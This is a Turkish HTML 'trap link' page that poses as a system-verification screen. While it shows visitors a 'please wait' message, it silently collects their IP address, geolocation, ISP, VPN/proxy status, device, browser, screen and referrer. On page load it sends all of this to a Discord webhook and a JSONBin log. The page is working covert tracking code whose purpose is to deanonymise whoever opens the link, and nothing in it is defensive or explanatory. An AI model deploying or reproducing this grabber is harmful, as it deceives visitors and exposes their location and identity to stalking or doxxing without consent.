<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sistem Doğrulama</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }
    .box {
      max-width: 460px;
      padding: 24px;
      border-radius: 12px;
      background: #1e293b;
      border: 1px solid #334155;
      text-align: center;
    }
    .muted {
      color: #94a3b8;
      font-size: 14px;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <div class="box">
    <h3 id="title">Bağlantı Kontrol Ediliyor</h3>
    <p class="muted" id="status">Lütfen bekleyin...</p>
  </div>

  <script src="config.js"></script>
  <script>
    async function loadContentJson() {
      if (!TRAP_CONFIG.contentFile) return null;
      try {
        const res = await fetch(TRAP_CONFIG.contentFile, { cache: "no-store" });
        if (!res.ok) return null;
        return await res.json();
      } catch {
        return null;
      }
    }

    function formatTimeDetails(dateObj = new Date()) {
      const trDate = new Intl.DateTimeFormat("tr-TR", {
        timeZone: "Europe/Istanbul",
        year: "numeric",
        month: "2-digit",
        day: "2-digit"
      }).format(dateObj);

      const trTime = new Intl.DateTimeFormat("tr-TR", {
        timeZone: "Europe/Istanbul",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false
      }).format(dateObj);

      const utcTime = dateObj.toISOString().split("T")[1].replace("Z", "");

      return {
        tarih_tr: trDate,
        saat_tr: `${trTime} (TR)`,
        saat_utc: `${utcTime} (UTC)`,
        iso: dateObj.toISOString()
      };
    }

    function detectDevice() {
      const ua = navigator.userAgent || "";
      const platform = navigator.platform || "Bilinmiyor";

      let os = "Bilinmiyor";
      if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
      else if (/Android/i.test(ua)) os = "Android";
      else if (/Windows/i.test(ua)) os = "Windows";
      else if (/Mac/i.test(ua)) os = "macOS";
      else if (/Linux/i.test(ua)) os = "Linux";

      let browser = "Bilinmiyor";
      if (/Edg\//i.test(ua)) browser = "Edge";
      else if (/OPR|Opera/i.test(ua)) browser = "Opera";
      else if (/Chrome/i.test(ua)) browser = "Chrome";
      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
      else if (/Firefox/i.test(ua)) browser = "Firefox";

      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);

      // Tarayıcı model gizlediği için cihaz etiketi veya tarayıcı özeti verilir
      const knownLabel = TRAP_CONFIG.deviceLabel || "Tarayıcı modeli gizli (Standart Android/Cihaz)";

      return {
        tur: isMobile ? "Mobil Cihaz" : "Masaüstü Cihaz",
        isletim_sistemi: os,
        tarayici: browser,
        platform: platform,
        cihaz_notu: knownLabel
      };
    }

    async function fetchIpAndGeo() {
      const res = await fetch("https://ipwho.is/");
      if (!res.ok) throw new Error("IP bilgisi alınamadı");
      return await res.json();
    }

    async function updateJsonBin(entry) {
      const url = `https://api.jsonbin.io/v3/b/${TRAP_CONFIG.jsonbinId}`;
      const getRes = await fetch(`${url}/latest`, {
        headers: {
          "X-Master-Key": TRAP_CONFIG.jsonbinKey
        }
      });

      let currentData = { logs: [] };
      if (getRes.ok) {
        const json = await getRes.json();
        if (json && json.record) {
          currentData = json.record;
          if (!Array.isArray(currentData.logs)) {
            currentData.logs = [];
          }
        }
      }

      currentData.last_updated = entry.zaman.iso;
      currentData.logs.push(entry);

      const putRes = await fetch(url, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          "X-Master-Key": TRAP_CONFIG.jsonbinKey
        },
        body: JSON.stringify(currentData)
      });

      return putRes.ok;
    }

    async function sendDiscordWebhook(entry) {
      const content = [
        "🚨 **TUZAK LİNK ERİŞİMİ ALGILANDI**",
        "━━━━━━━━━━━━━━━━━━━━━━",
        "📱 **CİHAZ BİLGİLERİ**",
        `• **Tür:** ${entry.cihaz.tur}`,
        `• **İşletim Sistemi:** ${entry.cihaz.isletim_sistemi}`,
        `• **Tarayıcı:** ${entry.cihaz.tarayici}`,
        `• **Platform:** ${entry.cihaz.platform}`,
        `• **Cihaz Notu:** ${entry.cihaz.cihaz_notu}`,
        "",
        "🕒 **ZAMAN BİLGİLERİ**",
        `• **Tarih (TR):** ${entry.zaman.tarih_tr}`,
        `• **Saat (TR):** ${entry.zaman.saat_tr}`,
        `• **Saat (UTC):** ${entry.zaman.saat_utc}`,
        "",
        "🌐 **AĞ VE IP BİLGİLERİ**",
        `• **IP Adresi:** \`${entry.ag.ip}\``,
        `• **IP Durumu:** **${entry.ag.ip_durumu}**`,
        `• **Konum:** ${entry.ag.konum}`,
        `• **Sağlayıcı (ISP / ASN):** ${entry.ag.saglayici}`,
        "",
        "🖥️ **TARAYICI VE EK DETAYLAR**",
        `• **Dil:** ${entry.detay.dil}`,
        `• **Ekran Çözünürlüğü:** ${entry.detay.ekran}`,
        `• **Geliş Kaynağı (Referrer):** ${entry.detay.referrer}`,
        `• **User-Agent:** \`${entry.detay.user_agent}\``,
        "━━━━━━━━━━━━━━━━━━━━━━"
      ].join("\n");

      const res = await fetch(TRAP_CONFIG.discordWebhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content })
      });

      return res.ok;
    }

    (async function runTrap() {
      const titleEl = document.getElementById("title");
      const statusEl = document.getElementById("status");
      const contentCfg = await loadContentJson();

      if (contentCfg?.title) titleEl.textContent = contentCfg.title;
      if (contentCfg?.waiting_text) statusEl.textContent = contentCfg.waiting_text;

      try {
        const geo = await fetchIpAndGeo();
        const sec = geo.security || {};
        const conn = geo.connection || {};

        const ispLower = `${conn.isp || ""} ${conn.org || ""}`.toLowerCase();
        const datacenterKeywords = [
          "datacamp", "hosting", "cloud", "vpn", "proxy", "digitalocean",
          "amazon", "aws", "google cloud", "hetzner", "ovh", "linode", "vultr", "m247"
        ];
        const looksLikeDatacenter = datacenterKeywords.some((k) => ispLower.includes(k));

        const isVpnOrProxy = Boolean(
          sec.vpn || sec.proxy || sec.tor || sec.hosting || looksLikeDatacenter
        );

        const locationParts = [geo.city, geo.region, geo.country].filter(Boolean);
        const locationText = locationParts.length ? locationParts.join(", ") : "Bilinmiyor";
        const ispText = conn.isp || conn.org || conn.asn || "Bilinmiyor";

        const entry = {
          tuzak: TRAP_CONFIG.trapLabel,
          zaman: formatTimeDetails(new Date()),
          cihaz: detectDevice(),
          ag: {
            ip: geo.ip || "Bilinmiyor",
            ip_durumu: isVpnOrProxy
              ? "VPN / Proxy / Hosting / Datacenter"
              : "Muhtemel Normal / ISP IP",
            konum: locationText,
            saglayici: ispText,
            bayraklar: {
              vpn: Boolean(sec.vpn),
              proxy: Boolean(sec.proxy),
              tor: Boolean(sec.tor),
              hosting: Boolean(sec.hosting),
              datacenter_eslesme: looksLikeDatacenter
            }
          },
          detay: {
            dil: navigator.language || "Bilinmiyor",
            ekran: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || "Doğrudan / Yok",
            user_agent: navigator.userAgent || "Bilinmiyor"
          }
        };

        await Promise.all([
          updateJsonBin(entry),
          sendDiscordWebhook(entry)
        ]);

        statusEl.textContent = contentCfg?.done_text || "Doğrulama tamamlandı.";
      } catch (err) {
        statusEl.textContent = "Bağlantı sonlandırıldı.";
      }
    })();
  </script>
</body>
</html>
